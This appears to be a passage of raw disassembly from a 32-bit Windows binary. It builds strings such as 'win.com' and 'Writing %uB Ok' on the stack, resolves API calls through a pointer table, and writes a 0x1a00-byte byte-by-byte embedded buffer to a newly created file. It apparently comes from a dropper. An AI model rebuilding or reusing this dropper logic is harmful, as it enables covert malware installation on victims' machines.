  4035ed:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4035f3:	89 41 24             	mov    DWORD PTR [ecx+0x24],eax
  4035f6:	8d 45 80             	lea    eax,[ebp-0x80]
  4035f9:	50                   	push   eax
  4035fa:	57                   	push   edi
  4035fb:	ff d6                	call   esi
  4035fd:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403603:	89 41 28             	mov    DWORD PTR [ecx+0x28],eax
  403606:	8d 45 ec             	lea    eax,[ebp-0x14]
  403609:	50                   	push   eax
  40360a:	57                   	push   edi
  40360b:	ff d6                	call   esi
  40360d:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403613:	89 41 2c             	mov    DWORD PTR [ecx+0x2c],eax
  403616:	8d 85 08 ff ff ff    	lea    eax,[ebp-0xf8]
  40361c:	50                   	push   eax
  40361d:	57                   	push   edi
  40361e:	ff d6                	call   esi
  403620:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403626:	89 41 30             	mov    DWORD PTR [ecx+0x30],eax
  403629:	8d 45 34             	lea    eax,[ebp+0x34]
  40362c:	50                   	push   eax
  40362d:	57                   	push   edi
  40362e:	ff d6                	call   esi
  403630:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403636:	89 41 34             	mov    DWORD PTR [ecx+0x34],eax
  403639:	8d 45 64             	lea    eax,[ebp+0x64]
  40363c:	50                   	push   eax
  40363d:	57                   	push   edi
  40363e:	ff d6                	call   esi
  403640:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403646:	89 41 38             	mov    DWORD PTR [ecx+0x38],eax
  403649:	8d 85 cc fe ff ff    	lea    eax,[ebp-0x134]
  40364f:	50                   	push   eax
  403650:	57                   	push   edi
  403651:	ff d6                	call   esi
  403653:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403659:	89 41 3c             	mov    DWORD PTR [ecx+0x3c],eax
  40365c:	8d 85 30 ff ff ff    	lea    eax,[ebp-0xd0]
  403662:	50                   	push   eax
  403663:	57                   	push   edi
  403664:	ff d6                	call   esi
  403666:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40366c:	89 41 40             	mov    DWORD PTR [ecx+0x40],eax
  40366f:	8d 85 44 ff ff ff    	lea    eax,[ebp-0xbc]
  403675:	50                   	push   eax
  403676:	57                   	push   edi
  403677:	ff d6                	call   esi
  403679:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40367f:	89 41 44             	mov    DWORD PTR [ecx+0x44],eax
  403682:	8d 85 e0 fe ff ff    	lea    eax,[ebp-0x120]
  403688:	50                   	push   eax
  403689:	57                   	push   edi
  40368a:	ff d6                	call   esi
  40368c:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403692:	89 41 48             	mov    DWORD PTR [ecx+0x48],eax
  403695:	8d 45 58             	lea    eax,[ebp+0x58]
  403698:	50                   	push   eax
  403699:	57                   	push   edi
  40369a:	ff d6                	call   esi
  40369c:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4036a2:	89 41 4c             	mov    DWORD PTR [ecx+0x4c],eax
  4036a5:	8d 45 28             	lea    eax,[ebp+0x28]
  4036a8:	50                   	push   eax
  4036a9:	57                   	push   edi
  4036aa:	ff d6                	call   esi
  4036ac:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4036b2:	89 41 50             	mov    DWORD PTR [ecx+0x50],eax
  4036b5:	8d 45 4c             	lea    eax,[ebp+0x4c]
  4036b8:	50                   	push   eax
  4036b9:	57                   	push   edi
  4036ba:	ff d6                	call   esi
  4036bc:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4036c2:	89 41 54             	mov    DWORD PTR [ecx+0x54],eax
  4036c5:	8d 45 d0             	lea    eax,[ebp-0x30]
  4036c8:	50                   	push   eax
  4036c9:	57                   	push   edi
  4036ca:	ff d6                	call   esi
  4036cc:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4036d2:	89 41 58             	mov    DWORD PTR [ecx+0x58],eax
  4036d5:	8d 85 6c ff ff ff    	lea    eax,[ebp-0x94]
  4036db:	50                   	push   eax
  4036dc:	57                   	push   edi
  4036dd:	ff d6                	call   esi
  4036df:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4036e5:	89 41 5c             	mov    DWORD PTR [ecx+0x5c],eax
  4036e8:	8d 45 10             	lea    eax,[ebp+0x10]
  4036eb:	50                   	push   eax
  4036ec:	57                   	push   edi
  4036ed:	ff d6                	call   esi
  4036ef:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  4036f5:	89 41 60             	mov    DWORD PTR [ecx+0x60],eax
  4036f8:	8d 85 8c fe ff ff    	lea    eax,[ebp-0x174]
  4036fe:	50                   	push   eax
  4036ff:	57                   	push   edi
  403700:	ff d6                	call   esi
  403702:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403708:	89 41 64             	mov    DWORD PTR [ecx+0x64],eax
  40370b:	8d 85 74 fe ff ff    	lea    eax,[ebp-0x18c]
  403711:	50                   	push   eax
  403712:	57                   	push   edi
  403713:	ff d6                	call   esi
  403715:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40371b:	89 41 68             	mov    DWORD PTR [ecx+0x68],eax
  40371e:	8d 85 a4 fe ff ff    	lea    eax,[ebp-0x15c]
  403724:	50                   	push   eax
  403725:	57                   	push   edi
  403726:	ff d6                	call   esi
  403728:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40372e:	89 41 70             	mov    DWORD PTR [ecx+0x70],eax
  403731:	8d 45 70             	lea    eax,[ebp+0x70]
  403734:	50                   	push   eax
  403735:	57                   	push   edi
  403736:	ff d6                	call   esi
  403738:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  40373e:	89 41 74             	mov    DWORD PTR [ecx+0x74],eax
  403741:	8d 85 58 ff ff ff    	lea    eax,[ebp-0xa8]
  403747:	50                   	push   eax
  403748:	57                   	push   edi
  403749:	ff d6                	call   esi
  40374b:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403751:	89 41 78             	mov    DWORD PTR [ecx+0x78],eax
  403754:	8d 45 f8             	lea    eax,[ebp-0x8]
  403757:	50                   	push   eax
  403758:	57                   	push   edi
  403759:	ff d6                	call   esi
  40375b:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403761:	89 41 7c             	mov    DWORD PTR [ecx+0x7c],eax
  403764:	8d 45 e0             	lea    eax,[ebp-0x20]
  403767:	50                   	push   eax
  403768:	57                   	push   edi
  403769:	ff d6                	call   esi
  40376b:	8b 0d cc 69 48 00    	mov    ecx,DWORD PTR ds:0x4869cc
  403771:	5f                   	pop    edi
  403772:	89 81 80 00 00 00    	mov    DWORD PTR [ecx+0x80],eax
  403778:	33 c0                	xor    eax,eax
  40377a:	5e                   	pop    esi
  40377b:	83 c5 78             	add    ebp,0x78
  40377e:	c9                   	leave
  40377f:	c3                   	ret
  403780:	55                   	push   ebp
  403781:	8b ec                	mov    ebp,esp
  403783:	81 ec 0c 01 00 00    	sub    esp,0x10c
  403789:	56                   	push   esi
  40378a:	68 04 01 00 00       	push   0x104
  40378f:	8d 85 f4 fe ff ff    	lea    eax,[ebp-0x10c]
  403795:	50                   	push   eax
  403796:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  40379b:	ff 50 08             	call   DWORD PTR [eax+0x8]
  40379e:	8d 45 f8             	lea    eax,[ebp-0x8]
  4037a1:	50                   	push   eax
  4037a2:	8d 85 f4 fe ff ff    	lea    eax,[ebp-0x10c]
  4037a8:	50                   	push   eax
  4037a9:	68 bc 25 42 00       	push   0x4225bc
  4037ae:	50                   	push   eax
  4037af:	c6 45 f8 77          	mov    BYTE PTR [ebp-0x8],0x77
  4037b3:	c6 45 f9 69          	mov    BYTE PTR [ebp-0x7],0x69
  4037b7:	c6 45 fa 6e          	mov    BYTE PTR [ebp-0x6],0x6e
  4037bb:	c6 45 fb 2e          	mov    BYTE PTR [ebp-0x5],0x2e
  4037bf:	c6 45 fc 63          	mov    BYTE PTR [ebp-0x4],0x63
  4037c3:	c6 45 fd 6f          	mov    BYTE PTR [ebp-0x3],0x6f
  4037c7:	c6 45 fe 6d          	mov    BYTE PTR [ebp-0x2],0x6d
  4037cb:	c6 45 ff 00          	mov    BYTE PTR [ebp-0x1],0x0
  4037cf:	ff 15 a8 11 42 00    	call   DWORD PTR ds:0x4211a8
  4037d5:	83 c4 10             	add    esp,0x10
  4037d8:	6a 00                	push   0x0
  4037da:	68 80 00 00 00       	push   0x80
  4037df:	6a 03                	push   0x3
  4037e1:	6a 00                	push   0x0
  4037e3:	6a 01                	push   0x1
  4037e5:	68 00 00 00 80       	push   0x80000000
  4037ea:	8d 85 f4 fe ff ff    	lea    eax,[ebp-0x10c]
  4037f0:	50                   	push   eax
  4037f1:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  4037f6:	ff 50 0c             	call   DWORD PTR [eax+0xc]
  4037f9:	8b f0                	mov    esi,eax
  4037fb:	83 fe ff             	cmp    esi,0xffffffff
  4037fe:	74 20                	je     0x403820
  403800:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  403805:	68 24 57 48 00       	push   0x485724
  40380a:	68 2c 57 48 00       	push   0x48572c
  40380f:	68 1c 57 48 00       	push   0x48571c
  403814:	56                   	push   esi
  403815:	ff 50 7c             	call   DWORD PTR [eax+0x7c]
  403818:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  40381d:	56                   	push   esi
  40381e:	ff 10                	call   DWORD PTR [eax]
  403820:	5e                   	pop    esi
  403821:	c9                   	leave
  403822:	c3                   	ret
  403823:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  403828:	56                   	push   esi
  403829:	6a 00                	push   0x0
  40382b:	68 80 00 00 00       	push   0x80
  403830:	6a 03                	push   0x3
  403832:	6a 00                	push   0x0
  403834:	6a 01                	push   0x1
  403836:	68 00 00 00 40       	push   0x40000000
  40383b:	ff 74 24 20          	push   DWORD PTR [esp+0x20]
  40383f:	ff 50 34             	call   DWORD PTR [eax+0x34]
  403842:	8b f0                	mov    esi,eax
  403844:	83 fe ff             	cmp    esi,0xffffffff
  403847:	74 23                	je     0x40386c
  403849:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  40384e:	68 24 57 48 00       	push   0x485724
  403853:	68 2c 57 48 00       	push   0x48572c
  403858:	68 1c 57 48 00       	push   0x48571c
  40385d:	56                   	push   esi
  40385e:	ff 90 80 00 00 00    	call   DWORD PTR [eax+0x80]
  403864:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  403869:	56                   	push   esi
  40386a:	ff 10                	call   DWORD PTR [eax]
  40386c:	5e                   	pop    esi
  40386d:	c3                   	ret
  40386e:	55                   	push   ebp
  40386f:	8b ec                	mov    ebp,esp
  403871:	83 ec 48             	sub    esp,0x48
  403874:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  403879:	53                   	push   ebx
  40387a:	57                   	push   edi
  40387b:	33 db                	xor    ebx,ebx
  40387d:	53                   	push   ebx
  40387e:	68 80 00 00 00       	push   0x80
  403883:	6a 02                	push   0x2
  403885:	53                   	push   ebx
  403886:	6a 01                	push   0x1
  403888:	68 00 00 00 40       	push   0x40000000
  40388d:	ff 75 0c             	push   DWORD PTR [ebp+0xc]
  403890:	c6 45 e8 57          	mov    BYTE PTR [ebp-0x18],0x57
  403894:	c6 45 e9 72          	mov    BYTE PTR [ebp-0x17],0x72
  403898:	c6 45 ea 69          	mov    BYTE PTR [ebp-0x16],0x69
  40389c:	c6 45 eb 74          	mov    BYTE PTR [ebp-0x15],0x74
  4038a0:	c6 45 ec 69          	mov    BYTE PTR [ebp-0x14],0x69
  4038a4:	c6 45 ed 6e          	mov    BYTE PTR [ebp-0x13],0x6e
  4038a8:	c6 45 ee 67          	mov    BYTE PTR [ebp-0x12],0x67
  4038ac:	c6 45 ef 20          	mov    BYTE PTR [ebp-0x11],0x20
  4038b0:	c6 45 f0 25          	mov    BYTE PTR [ebp-0x10],0x25
  4038b4:	c6 45 f1 75          	mov    BYTE PTR [ebp-0xf],0x75
  4038b8:	c6 45 f2 42          	mov    BYTE PTR [ebp-0xe],0x42
  4038bc:	c6 45 f3 20          	mov    BYTE PTR [ebp-0xd],0x20
  4038c0:	c6 45 f4 4f          	mov    BYTE PTR [ebp-0xc],0x4f
  4038c4:	c6 45 f5 6b          	mov    BYTE PTR [ebp-0xb],0x6b
  4038c8:	c6 45 f6 0d          	mov    BYTE PTR [ebp-0xa],0xd
  4038cc:	c6 45 f7 0a          	mov    BYTE PTR [ebp-0x9],0xa
  4038d0:	88 5d f8             	mov    BYTE PTR [ebp-0x8],bl
  4038d3:	c6 45 b8 57          	mov    BYTE PTR [ebp-0x48],0x57
  4038d7:	c6 45 b9 72          	mov    BYTE PTR [ebp-0x47],0x72
  4038db:	c6 45 ba 69          	mov    BYTE PTR [ebp-0x46],0x69
  4038df:	c6 45 bb 74          	mov    BYTE PTR [ebp-0x45],0x74
  4038e3:	c6 45 bc 69          	mov    BYTE PTR [ebp-0x44],0x69
  4038e7:	c6 45 bd 6e          	mov    BYTE PTR [ebp-0x43],0x6e
  4038eb:	c6 45 be 67          	mov    BYTE PTR [ebp-0x42],0x67
  4038ef:	c6 45 bf 20          	mov    BYTE PTR [ebp-0x41],0x20
  4038f3:	c6 45 c0 25          	mov    BYTE PTR [ebp-0x40],0x25
  4038f7:	c6 45 c1 75          	mov    BYTE PTR [ebp-0x3f],0x75
  4038fb:	c6 45 c2 42          	mov    BYTE PTR [ebp-0x3e],0x42
  4038ff:	c6 45 c3 20          	mov    BYTE PTR [ebp-0x3d],0x20
  403903:	c6 45 c4 66          	mov    BYTE PTR [ebp-0x3c],0x66
  403907:	c6 45 c5 61          	mov    BYTE PTR [ebp-0x3b],0x61
  40390b:	c6 45 c6 69          	mov    BYTE PTR [ebp-0x3a],0x69
  40390f:	c6 45 c7 6c          	mov    BYTE PTR [ebp-0x39],0x6c
  403913:	c6 45 c8 73          	mov    BYTE PTR [ebp-0x38],0x73
  403917:	c6 45 c9 20          	mov    BYTE PTR [ebp-0x37],0x20
  40391b:	c6 45 ca 28          	mov    BYTE PTR [ebp-0x36],0x28
  40391f:	c6 45 cb 25          	mov    BYTE PTR [ebp-0x35],0x25
  403923:	c6 45 cc 75          	mov    BYTE PTR [ebp-0x34],0x75
  403927:	c6 45 cd 29          	mov    BYTE PTR [ebp-0x33],0x29
  40392b:	c6 45 ce 0d          	mov    BYTE PTR [ebp-0x32],0xd
  40392f:	c6 45 cf 0a          	mov    BYTE PTR [ebp-0x31],0xa
  403933:	88 5d d0             	mov    BYTE PTR [ebp-0x30],bl
  403936:	c6 45 d4 20          	mov    BYTE PTR [ebp-0x2c],0x20
  40393a:	c6 45 d5 43          	mov    BYTE PTR [ebp-0x2b],0x43
  40393e:	c6 45 d6 72          	mov    BYTE PTR [ebp-0x2a],0x72
  403942:	c6 45 d7 65          	mov    BYTE PTR [ebp-0x29],0x65
  403946:	c6 45 d8 61          	mov    BYTE PTR [ebp-0x28],0x61
  40394a:	c6 45 d9 74          	mov    BYTE PTR [ebp-0x27],0x74
  40394e:	c6 45 da 69          	mov    BYTE PTR [ebp-0x26],0x69
  403952:	c6 45 db 6e          	mov    BYTE PTR [ebp-0x25],0x6e
  403956:	c6 45 dc 67          	mov    BYTE PTR [ebp-0x24],0x67
  40395a:	c6 45 dd 20          	mov    BYTE PTR [ebp-0x23],0x20
  40395e:	c6 45 de 25          	mov    BYTE PTR [ebp-0x22],0x25
  403962:	c6 45 df 73          	mov    BYTE PTR [ebp-0x21],0x73
  403966:	c6 45 e0 20          	mov    BYTE PTR [ebp-0x20],0x20
  40396a:	c6 45 e1 28          	mov    BYTE PTR [ebp-0x1f],0x28
  40396e:	c6 45 e2 25          	mov    BYTE PTR [ebp-0x1e],0x25
  403972:	c6 45 e3 75          	mov    BYTE PTR [ebp-0x1d],0x75
  403976:	c6 45 e4 29          	mov    BYTE PTR [ebp-0x1c],0x29
  40397a:	c6 45 e5 0d          	mov    BYTE PTR [ebp-0x1b],0xd
  40397e:	c6 45 e6 0a          	mov    BYTE PTR [ebp-0x1a],0xa
  403982:	88 5d e7             	mov    BYTE PTR [ebp-0x19],bl
  403985:	ff 50 0c             	call   DWORD PTR [eax+0xc]
  403988:	8b f8                	mov    edi,eax
  40398a:	83 ff ff             	cmp    edi,0xffffffff
  40398d:	74 55                	je     0x4039e4
  40398f:	56                   	push   esi
  403990:	53                   	push   ebx
  403991:	8d 45 fc             	lea    eax,[ebp-0x4]
  403994:	50                   	push   eax
  403995:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  40399a:	be 00 1a 00 00       	mov    esi,0x1a00
  40399f:	56                   	push   esi
  4039a0:	ff 75 08             	push   DWORD PTR [ebp+0x8]
  4039a3:	89 5d fc             	mov    DWORD PTR [ebp-0x4],ebx
  4039a6:	57                   	push   edi
  4039a7:	ff 50 38             	call   DWORD PTR [eax+0x38]
  4039aa:	85 c0                	test   eax,eax
  4039ac:	74 12                	je     0x4039c0
  4039ae:	56                   	push   esi
  4039af:	8d 45 e8             	lea    eax,[ebp-0x18]
  4039b2:	50                   	push   eax
  4039b3:	43                   	inc    ebx
  4039b4:	53                   	push   ebx
  4039b5:	ff 15 bc 69 48 00    	call   DWORD PTR ds:0x4869bc
  4039bb:	83 c4 0c             	add    esp,0xc
  4039be:	eb 17                	jmp    0x4039d7
  4039c0:	ff 15 1c 10 42 00    	call   DWORD PTR ds:0x42101c
  4039c6:	50                   	push   eax
  4039c7:	56                   	push   esi
  4039c8:	8d 45 b8             	lea    eax,[ebp-0x48]
  4039cb:	50                   	push   eax
  4039cc:	6a 01                	push   0x1
  4039ce:	ff 15 bc 69 48 00    	call   DWORD PTR ds:0x4869bc
  4039d4:	83 c4 10             	add    esp,0x10
  4039d7:	a1 cc 69 48 00       	mov    eax,ds:0x4869cc
  4039dc:	57                   	push   edi
  4039dd:	ff 10                	call   DWORD PTR [eax]
  4039df:	8b c3                	mov    eax,ebx
  4039e1:	5e                   	pop    esi
  4039e2:	eb 1b                	jmp    0x4039ff
  4039e4:	ff 15 1c 10 42 00    	call   DWORD PTR ds:0x42101c
  4039ea:	50                   	push   eax
  4039eb:	ff 75 0c             	push   DWORD PTR [ebp+0xc]
  4039ee:	8d 45 d4             	lea    eax,[ebp-0x2c]
  4039f1:	50                   	push   eax
  4039f2:	6a 01                	push   0x1
  4039f4:	ff 15 bc 69 48 00    	call   DWORD PTR ds:0x4869bc
  4039fa:	83 c4 10             	add    esp,0x10
  4039fd:	33 c0                	xor    eax,eax
  4039ff:	5f                   	pop    edi
  403a00:	5b                   	pop    ebx
  403a01:	c9                   	leave
  403a02:	c3                   	ret
  403a03:	55                   	push   ebp
  403a04:	8b ec                	mov    ebp,esp
  403a06:	b8 6c 20 00 00       	mov    eax,0x206c
  403a0b:	e8 e0 87 01 00       	call   0x41c1f0
  403a10:	53                   	push   ebx
  403a11:	33 db                	xor    ebx,ebx
  403a13:	57                   	push   edi
  403a14:	c6 85 00 e6 ff ff 4d 	mov    BYTE PTR [ebp-0x1a00],0x4d
  403a1b:	c6 85 01 e6 ff ff 8a 	mov    BYTE PTR [ebp-0x19ff],0x8a
  403a22:	c6 85 02 e6 ff ff 90 	mov    BYTE PTR [ebp-0x19fe],0x90
  403a29:	c6 85 03 e6 ff ff a0 	mov    BYTE PTR [ebp-0x19fd],0xa0
  403a30:	c6 85 04 e6 ff ff 43 	mov    BYTE PTR [ebp-0x19fc],0x43
  403a37:	c6 85 05 e6 ff ff 40 	mov    BYTE PTR [ebp-0x19fb],0x40
  403a3e:	c6 85 06 e6 ff ff e0 	mov    BYTE PTR [ebp-0x19fa],0xe0
  403a45:	c6 85 07 e6 ff ff b0 	mov    BYTE PTR [ebp-0x19f9],0xb0
  403a4c:	c6 85 08 e6 ff ff 04 	mov    BYTE PTR [ebp-0x19f8],0x4
  403a53:	c6 85 09 e6 ff ff 30 	mov    BYTE PTR [ebp-0x19f7],0x30
  403a5a:	c6 85 0a e6 ff ff e0 	mov    BYTE PTR [ebp-0x19f6],0xe0
  403a61:	c6 85 0b e6 ff ff 60 	mov    BYTE PTR [ebp-0x19f5],0x60
  403a68:	c6 85 0c e6 ff ff 7f 	mov    BYTE PTR [ebp-0x19f4],0x7f
  403a6f:	c6 85 0d e6 ff ff 6f 	mov    BYTE PTR [ebp-0x19f3],0x6f
  403a76:	c6 85 0e e6 ff ff e0 	mov    BYTE PTR [ebp-0x19f2],0xe0
  403a7d:	c6 85 0f e6 ff ff b0 	mov    BYTE PTR [ebp-0x19f1],0xb0
  403a84:	c6 85 10 e6 ff ff b8 	mov    BYTE PTR [ebp-0x19f0],0xb8
  403a8b:	c6 85 11 e6 ff ff e0 	mov    BYTE PTR [ebp-0x19ef],0xe0
  403a92:	c6 85 12 e6 ff ff 60 	mov    BYTE PTR [ebp-0x19ee],0x60
  403a99:	c6 85 13 e6 ff ff 70 	mov    BYTE PTR [ebp-0x19ed],0x70
  403aa0:	88 9d 14 e6 ff ff    	mov    BYTE PTR [ebp-0x19ec],bl
  403aa6:	c6 85 15 e6 ff ff 70 	mov    BYTE PTR [ebp-0x19eb],0x70
  403aad:	c6 85 16 e6 ff ff c0 	mov    BYTE PTR [ebp-0x19ea],0xc0
  403ab4:	c6 85 17 e6 ff ff 50 	mov    BYTE PTR [ebp-0x19e9],0x50
  403abb:	c6 85 18 e6 ff ff 40 	mov    BYTE PTR [ebp-0x19e8],0x40
  403ac2:	c6 85 19 e6 ff ff 40 	mov    BYTE PTR [ebp-0x19e7],0x40
  403ac9:	88 9d 1a e6 ff ff    	mov    BYTE PTR [ebp-0x19e6],bl
  403acf:	c6 85 1b e6 ff ff 10 	mov    BYTE PTR [ebp-0x19e5],0x10
  403ad6:	88 9d 1c e6 ff ff    	mov    BYTE PTR [ebp-0x19e4],bl
  403adc:	c6 85 1d e6 ff ff e0 	mov    BYTE PTR [ebp-0x19e3],0xe0
  403ae3:	c6 85 1e e6 ff ff 40 	mov    BYTE PTR [ebp-0x19e2],0x40
  403aea:	c6 85 1f e6 ff ff d0 	mov    BYTE PTR [ebp-0x19e1],0xd0
  403af1:	88 9d 20 e6 ff ff    	mov    BYTE PTR [ebp-0x19e0],bl
  403af7:	c6 85 21 e6 ff ff 40 	mov    BYTE PTR [ebp-0x19df],0x40
  403afe:	c6 85 22 e6 ff ff a0 	mov    BYTE PTR [ebp-0x19de],0xa0
  403b05:	88 9d 23 e6 ff ff    	mov    BYTE PTR [ebp-0x19dd],bl
  403b0b:	88 9d 24 e6 ff ff    	mov    BYTE PTR [ebp-0x19dc],bl
  403b11:	88 9d 25 e6 ff ff    	mov    BYTE PTR [ebp-0x19db],bl
  403b17:	c6 85 26 e6 ff ff e0 	mov    BYTE PTR [ebp-0x19da],0xe0
  403b1e:	c6 85 27 e6 ff ff 50 	mov    BYTE PTR [ebp-0x19d9],0x50
  403b25:	c6 85 28 e6 ff ff 80 	mov    BYTE PTR [ebp-0x19d8],0x80
  403b2c:	c6 85 29 e6 ff ff 50 	mov    BYTE PTR [ebp-0x19d7],0x50
  403b33:	c6 85 2a e6 ff ff 40 	mov    BYTE PTR [ebp-0x19d6],0x40
  403b3a:	c6 85 2b e6 ff ff 70 	mov    BYTE PTR [ebp-0x19d5],0x70
  403b41:	c6 85 2c e6 ff ff c0 	mov    BYTE PTR [ebp-0x19d4],0xc0
  403b48:	c6 85 2d e6 ff ff 20 	mov    BYTE PTR [ebp-0x19d3],0x20
  403b4f:	c6 85 2e e6 ff ff 20 	mov    BYTE PTR [ebp-0x19d2],0x20
  403b56:	c6 85 2f e6 ff ff 70 	mov    BYTE PTR [ebp-0x19d1],0x70
  403b5d:	88 9d 30 e6 ff ff    	mov    BYTE PTR [ebp-0x19d0],bl
  403b63:	c6 85 31 e6 ff ff d0 	mov    BYTE PTR [ebp-0x19cf],0xd0
  403b6a:	88 9d 32 e6 ff ff    	mov    BYTE PTR [ebp-0x19ce],bl
  403b70:	88 9d 33 e6 ff ff    	mov    BYTE PTR [ebp-0x19cd],bl
  403b76:	c6 85 34 e6 ff ff c0 	mov    BYTE PTR [ebp-0x19cc],0xc0
  403b7d:	c6 85 35 e6 ff ff b0 	mov    BYTE PTR [ebp-0x19cb],0xb0
  403b84:	88 9d 36 e6 ff ff    	mov    BYTE PTR [ebp-0x19ca],bl
  403b8a:	c6 85 37 e6 ff ff b0 	mov    BYTE PTR [ebp-0x19c9],0xb0
  403b91:	c6 85 38 e6 ff ff 80 	mov    BYTE PTR [ebp-0x19c8],0x80
  403b98:	c6 85 39 e6 ff ff 40 	mov    BYTE PTR [ebp-0x19c7],0x40
  403b9f:	c6 85 3a e6 ff ff c0 	mov    BYTE PTR [ebp-0x19c6],0xc0
  403ba6:	c6 85 3b e6 ff ff 20 	mov    BYTE PTR [ebp-0x19c5],0x20
  403bad:	c6 85 3c e6 ff ff 90 	mov    BYTE PTR [ebp-0x19c4],0x90
  403bb4:	c6 85 3d e6 ff ff e0 	mov    BYTE PTR [ebp-0x19c3],0xe0
  403bbb:	88 9d 3e e6 ff ff    	mov    BYTE PTR [ebp-0x19c2],bl
  403bc1:	c6 85 3f e6 ff ff 50 	mov    BYTE PTR [ebp-0x19c1],0x50
  403bc8:	c6 85 40 e6 ff ff 0e 	mov    BYTE PTR [ebp-0x19c0],0xe
  403bcf:	c6 85 41 e6 ff ff ef 	mov    BYTE PTR [ebp-0x19bf],0xef
  403bd6:	c6 85 42 e6 ff ff ba 	mov    BYTE PTR [ebp-0x19be],0xba
  403bdd:	c6 85 43 e6 ff ff ae 	mov    BYTE PTR [ebp-0x19bd],0xae
  403be4:	c6 85 44 e6 ff ff 40 	mov    BYTE PTR [ebp-0x19bc],0x40
  403beb:	c6 85 45 e6 ff ff a4 	mov    BYTE PTR [ebp-0x19bb],0xa4
  403bf2:	c6 85 46 e6 ff ff a9 	mov    BYTE PTR [ebp-0x19ba],0xa9
  403bf9:	c6 85 47 e6 ff ff 3d 	mov    BYTE PTR [ebp-0x19b9],0x3d
  403c00:	c6 85 48 e6 ff ff 21 	mov    BYTE PTR [ebp-0x19b8],0x21
  403c07:	c6 85 49 e6 ff ff 08 	mov    BYTE PTR [ebp-0x19b7],0x8
  403c0e:	c6 85 4a e6 ff ff 01 	mov    BYTE PTR [ebp-0x19b6],0x1
  403c15:	c6 85 4b e6 ff ff 6c 	mov    BYTE PTR [ebp-0x19b5],0x6c
  403c1c:	c6 85 4c e6 ff ff 4d 	mov    BYTE PTR [ebp-0x19b4],0x4d
  403c23:	c6 85 4d e6 ff ff d1 	mov    BYTE PTR [ebp-0x19b3],0xd1
  403c2a:	c6 85 4e e6 ff ff 54 	mov    BYTE PTR [ebp-0x19b2],0x54
  403c31:	c6 85 4f e6 ff ff 28 	mov    BYTE PTR [ebp-0x19b1],0x28
  403c38:	c6 85 50 e6 ff ff 69 	mov    BYTE PTR [ebp-0x19b0],0x69
  403c3f:	c6 85 51 e6 ff ff 43 	mov    BYTE PTR [ebp-0x19af],0x43
  403c46:	c6 85 52 e6 ff ff e0 	mov    BYTE PTR [ebp-0x19ae],0xe0
  403c4d:	c6 85 53 e6 ff ff 30 	mov    BYTE PTR [ebp-0x19ad],0x30
  403c54:	c6 85 54 e6 ff ff f2 	mov    BYTE PTR [ebp-0x19ac],0xf2
  403c5b:	c6 85 55 e6 ff ff 7f 	mov    BYTE PTR [ebp-0x19ab],0x7f
  403c62:	c6 85 56 e6 ff ff 47 	mov    BYTE PTR [ebp-0x19aa],0x47
  403c69:	c6 85 57 e6 ff ff d2 	mov    BYTE PTR [ebp-0x19a9],0xd2
  403c70:	c6 85 58 e6 ff ff e1 	mov    BYTE PTR [ebp-0x19a8],0xe1
  403c77:	c6 85 59 e6 ff ff 3d 	mov    BYTE PTR [ebp-0x19a7],0x3d
  403c7e:	c6 85 5a e6 ff ff 40 	mov    BYTE PTR [ebp-0x19a6],0x40
  403c85:	c6 85 5b e6 ff ff 93 	mov    BYTE PTR [ebp-0x19a5],0x93
  403c8c:	c6 85 5c e6 ff ff 61 	mov    BYTE PTR [ebp-0x19a4],0x61
  403c93:	c6 85 5d e6 ff ff de 	mov    BYTE PTR [ebp-0x19a3],0xde
  403c9a:	c6 85 5e e6 ff ff ae 	mov    BYTE PTR [ebp-0x19a2],0xae
  403ca1:	c6 85 5f e6 ff ff 6f 	mov    BYTE PTR [ebp-0x19a1],0x6f
  403ca8:	c6 85 60 e6 ff ff 74 	mov    BYTE PTR [ebp-0x19a0],0x74
  403caf:	c6 85 61 e6 ff ff 20 	mov    BYTE PTR [ebp-0x199f],0x20
  403cb6:	c6 85 62 e6 ff ff 02 	mov    BYTE PTR [ebp-0x199e],0x2
  403cbd:	c6 85 63 e6 ff ff a5 	mov    BYTE PTR [ebp-0x199d],0xa5
  403cc4:	c6 85 64 e6 ff ff 20 	mov    BYTE PTR [ebp-0x199c],0x20
  403ccb:	c6 85 65 e6 ff ff b2 	mov    BYTE PTR [ebp-0x199b],0xb2
  403cd2:	c6 85 66 e6 ff ff 75 	mov    BYTE PTR [ebp-0x199a],0x75
  403cd9:	c6 85 67 e6 ff ff 1e 	mov    BYTE PTR [ebp-0x1999],0x1e
